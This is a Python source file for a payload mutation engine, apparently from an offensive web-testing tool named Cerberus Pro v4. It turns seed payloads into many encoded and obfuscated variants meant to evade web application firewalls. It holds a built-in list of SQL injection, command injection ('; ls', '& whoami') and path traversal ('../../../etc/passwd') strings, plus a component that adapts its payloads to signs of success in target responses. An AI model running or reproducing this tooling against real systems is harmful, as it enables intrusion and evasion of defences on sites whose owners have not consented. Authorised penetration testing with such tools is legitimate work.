"""
Cerberus Pro v4 - Payload Mutation Engine v2

Generates 1000+ payload variants through encoding chains,
obfuscation, and adaptive mutation strategies.
"""

import hashlib
import base64
import urllib.parse
import json
from typing import List, Dict, Set, Any
from enum import Enum


class EncodingType(str, Enum):
    """Encoding strategies"""
    URL = "url"
    BASE64 = "base64"
    HEX = "hex"
    HTML = "html"
    UNICODE = "unicode"
    OCTAL = "octal"
    DOUBLE_URL = "double_url"
    MIXED = "mixed"


class ObfuscationType(str, Enum):
    """Obfuscation strategies"""
    CASE_SWITCH = "case_switch"  # rAnDoM cAsE
    COMMENT_INJECTION = "comment_inject"  # /**/
    SPACE_REPLACEMENT = "space_replace"  # tabs, newlines
    OPERATOR_SUBSTITUTION = "operator_sub"  # || instead of OR
    UNICODE_NORMALIZATION = "unicode_norm"  # Unicode variations
    POLYGLOT = "polyglot"  # SQL + command chaining


class PayloadTamper(str, Enum):
    """Tamper techniques"""
    APPEND_COMMENT = "append_comment"
    PREPEND_COMMENT = "prepend_comment"
    RANDOMCASE = "randomcase"
    BETWEEN = "between"  # a BETWEEN b AND c
    CHARENCODE = "charencode"
    PERCENTAGE = "percentage"  # %25 for %
    APPENDNULLBYTE = "appendnull"


class PayloadMutationEngine:
    """Generates adaptive payload variants"""

    def __init__(self, seed_payload: str, mutation_level: int = 2, custom_hints: Dict[str, Any] = None):
        """
        Initialize mutation engine.

        Args:
            seed_payload: Base payload to mutate
            mutation_level: 1=light, 2=medium, 3=aggressive
        """
        self.seed_payload = seed_payload
        self.mutation_level = mutation_level
        self.generated_variants: Set[str] = set()
        self.mutation_history: List[Dict] = []
        # Hints coming from WAF evasion strategies / engine config
        self.hints: Dict[str, Any] = custom_hints or {}

    def generate_variants(self, target_count: int = 100) -> List[str]:
        """Generate payload variants until reaching target_count or no new variants"""
        variants = []
        # Allow WAF hints to reduce or increase payload budget
        if isinstance(self.hints.get("max_payloads"), int):
            target_count = min(target_count, int(self.hints.get("max_payloads")))

        max_iterations = max(100, target_count * 10)  # Prevent infinite loops

        iteration = 0
        while len(variants) < target_count and iteration < max_iterations:
            mutation_type = self._select_mutation_strategy(iteration)
            variant = self._apply_mutation(mutation_type)

            # Apply hint-driven post-processing
            if self.hints.get("double_encode"):
                # apply URL encoding once (could be applied multiple times by adapter)
                variant = urllib.parse.quote(variant)

            if self.hints.get("append_null_byte"):
                variant = variant + "%00"

            if self.hints.get("tamper_hint") == "comment_injection":
                variant = variant + " /**/"

            if variant not in self.generated_variants:
                self.generated_variants.add(variant)
                variants.append(variant)
                self.mutation_history.append({
                    "variant": variant,
                    "strategy": mutation_type,
                    "iteration": iteration,
                })

            iteration += 1

        return variants

    def _select_mutation_strategy(self, iteration: int) -> str:
        """Select mutation strategy based on iteration"""
        strategies = [
            "encoding",
            "obfuscation",
            "tamper",
            "polymorphic",
            "hybrid",
        ]

        # Rotate through strategies
        return strategies[iteration % len(strategies)]

    def _apply_mutation(self, strategy: str) -> str:
        """Apply mutation based on strategy"""
        if strategy == "encoding":
            return self._encode_payload()
        elif strategy == "obfuscation":
            return self._obfuscate_payload()
        elif strategy == "tamper":
            return self._tamper_payload()
        elif strategy == "polymorphic":
            return self._polymorphic_mutation()
        elif strategy == "hybrid":
            return self._hybrid_mutation()
        else:
            return self.seed_payload

    def _encode_payload(self) -> str:
        """Apply encoding transformation"""
        import random

        encoding = random.choice(list(EncodingType))

        if encoding == EncodingType.URL:
            return urllib.parse.quote(self.seed_payload)
        elif encoding == EncodingType.BASE64:
            return base64.b64encode(self.seed_payload.encode()).decode()
        elif encoding == EncodingType.HEX:
            return "0x" + self.seed_payload.encode().hex()
        elif encoding == EncodingType.HTML:
            return self._html_encode(self.seed_payload)
        elif encoding == EncodingType.UNICODE:
            return self._unicode_encode(self.seed_payload)
        elif encoding == EncodingType.OCTAL:
            return self._octal_encode(self.seed_payload)
        elif encoding == EncodingType.DOUBLE_URL:
            return urllib.parse.quote(urllib.parse.quote(self.seed_payload))
        elif encoding == EncodingType.MIXED:
            # Random mix of multiple encodings
            parts = self.seed_payload.split(" ")
            encoded_parts = []
            for part in parts:
                if hash(part) % 2 == 0:
                    encoded_parts.append(urllib.parse.quote(part))
                else:
                    encoded_parts.append(part)
            return " ".join(encoded_parts)
        else:
            return self.seed_payload

    def _obfuscate_payload(self) -> str:
        """Apply obfuscation transformation"""
        import random

        obfuscation = random.choice(list(ObfuscationType))

        if obfuscation == ObfuscationType.CASE_SWITCH:
            return self._randomcase(self.seed_payload)
        elif obfuscation == ObfuscationType.COMMENT_INJECTION:
            return self._inject_comments(self.seed_payload)
        elif obfuscation == ObfuscationType.SPACE_REPLACEMENT:
            return self._replace_spaces(self.seed_payload)
        elif obfuscation == ObfuscationType.OPERATOR_SUBSTITUTION:
            return self._substitute_operators(self.seed_payload)
        elif obfuscation == ObfuscationType.UNICODE_NORMALIZATION:
            return self._unicode_obfuscate(self.seed_payload)
        elif obfuscation == ObfuscationType.POLYGLOT:
            return self._polyglot_mutation(self.seed_payload)
        else:
            return self.seed_payload

    def _tamper_payload(self) -> str:
        """Apply tamper technique"""
        import random

        tamper = random.choice(list(PayloadTamper))

        if tamper == PayloadTamper.APPEND_COMMENT:
            return f"{self.seed_payload} /**/)"
        elif tamper == PayloadTamper.PREPEND_COMMENT:
            return f"/**/ {self.seed_payload}"
        elif tamper == PayloadTamper.RANDOMCASE:
            return self._randomcase(self.seed_payload)
        elif tamper == PayloadTamper.BETWEEN:
            # Convert " OR " to " BETWEEN " patterns
            return self.seed_payload.replace(" OR ", " BETWEEN ")
        elif tamper == PayloadTamper.CHARENCODE:
            return self._char_encode(self.seed_payload)
        elif tamper == PayloadTamper.PERCENTAGE:
            return self.seed_payload.replace("%", "%25")
        elif tamper == PayloadTamper.APPENDNULLBYTE:
            return self.seed_payload + "%00"
        else:
            return self.seed_payload

    def _polymorphic_mutation(self) -> str:
        """SQL-to-RCE polyglot mutations"""
        import random

        mutations = [
            # SQLi variants
            f"1' UNION ALL SELECT 1-- -",
            f"1' UNION ALL SELECT 1,2-- -",
            f"1' UNION ALL SELECT @@version-- -",
            f"1 AND 1=1-- -",
            f"1 OR 'a'='a",
            f"1' OR '1'='1",
            f"admin' --",
            f"admin' #",
            # Command injection variants
            f"; ls",
            f"| ls",
            f"` ls `",
            f"$( ls )",
            f"& whoami",
            # Path traversal variants
            f"../../../etc/passwd",
            f"..%2f..%2f..%2fetc%2fpasswd",
            f"//../../../../etc/passwd",
        ]

        return random.choice(mutations)

    def _hybrid_mutation(self) -> str:
        """Combine multiple mutation strategies"""
        import random

        # First apply obfuscation
        obfuscated = self._obfuscate_payload()
        # Then apply encoding
        variant = self._encode_payload()
        # Randomly combine them
        if random.choice([True, False]):
            return obfuscated
        else:
            return variant

    @staticmethod
    def _randomcase(payload: str) -> str:
        """Randomize case"""
        import random

        return "".join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)

    @staticmethod
    def _inject_comments(payload: str) -> str:
        """Inject SQL comments"""
        import random

        comment_styles = ["/**/", "-- ", "#"]
        comment = random.choice(comment_styles)
        return f"{payload}{comment}"

    @staticmethod
    def _replace_spaces(payload: str) -> str:
        """Replace spaces with tabs/newlines"""
        import random

        replacements = ["\t", "\n", "\r", "",  "/**/ "]
        replacement = random.choice(replacements)
        return payload.replace(" ", replacement)

    @staticmethod
    def _substitute_operators(payload: str) -> str:
        """Substitute operators"""
        result = payload
        result = result.replace(" OR ", " || ")
        result = result.replace(" AND ", " && ")
        result = result.replace(" NOT ", " !")
        return result

    @staticmethod
    def _html_encode(payload: str) -> str:
        """HTML entity encoding"""
        return "".join(f"&#{ord(c)};" for c in payload)

    @staticmethod
    def _unicode_encode(payload: str) -> str:
        """Unicode escape encoding"""
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def _octal_encode(payload: str) -> str:
        """Octal encoding"""
        return "".join(f"\\{oct(ord(c))[2:]}" for c in payload)

    @staticmethod
    def _char_encode(payload: str) -> str:
        """CHAR() encoding for SQL"""
        char_codes = [str(ord(c)) for c in payload]
        return f"CHAR({','.join(char_codes)})"

    @staticmethod
    def _unicode_obfuscate(payload: str) -> str:
        """Unicode normalization for obfuscation"""
        import unicodedata

        return "".join(
            unicodedata.normalize("NFKC", c) for c in payload
        )

    @staticmethod
    def _polyglot_mutation(payload: str) -> str:
        """Create polyglot payload"""
        # SQL comment that's also valid in other contexts
        return f"1' /*! /*!50000... */ {payload} -- -"

    def get_statistics(self) -> Dict:
        """Get mutation statistics"""
        strategies_used = {}
        for entry in self.mutation_history:
            strategy = entry["strategy"]
            strategies_used[strategy] = strategies_used.get(strategy, 0) + 1

        return {
            "seed_payload": self.seed_payload,
            "total_variants": len(self.generated_variants),
            "mutation_level": self.mutation_level,
            "strategies_used": strategies_used,
            "mutations_applied": len(self.mutation_history),
        }


class AdaptivePayloadMutator:
    """Uses response feedback to adapt payload generation"""

    def __init__(self, vulnerability_type: str):
        self.vulnerability_type = vulnerability_type
        self.successful_patterns: List[str] = []
        self.failed_patterns: List[str] = []
        self.response_indicators: Dict[str, int] = {}

    def analyze_response(self, response_text: str, was_successful: bool):
        """Learn from response to adapt future mutations"""
        indicators = self._extract_indicators(response_text)
        self.response_indicators.update(indicators)

        if was_successful:
            self.successful_patterns.append(response_text)
        else:
            self.failed_patterns.append(response_text)

    def _extract_indicators(self, response_text: str) -> Dict[str, int]:
        """Extract vulnerability indicators from response"""
        indicators = {}

        # SQL indicators
        if any(x in response_text.lower() for x in ["syntax error", "sql", "mysql", "postgresql"]):
            indicators["sql_error"] = 1

        # Command injection indicators
        if any(x in response_text for x in ["uid=", "root:", "/bin/bash"]):
            indicators["rce_success"] = 1

        # Path traversal indicators
        if "/etc/passwd" in response_text or "root:x:0:0" in response_text:
            indicators["traversal_success"] = 1

        # XSS indicators
        if "<script>" in response_text or "javascript:" in response_text:
            indicators["xss_reflected"] = 1

        return indicators

    def get_next_mutation_strategy(self) -> str:
        """Get recommended mutation strategy based on learned patterns"""
        if not self.response_indicators:
            return "encoding"  # Default start

        # Prioritize strategies that worked before
        if self.successful_patterns:
            if len(self.successful_patterns) > len(self.failed_patterns):
                return "hybrid"  # Continue with hybrid approach
            else:
                return "polymorphic"  # Try new strategies

        return "tamper"

    def get_statistics(self) -> Dict:
        """Get adaptation statistics"""
        return {
            "vulnerability_type": self.vulnerability_type,
            "successful_patterns_learned": len(self.successful_patterns),
            "failed_patterns_learned": len(self.failed_patterns),
            "indicators_found": len(self.response_indicators),
        }
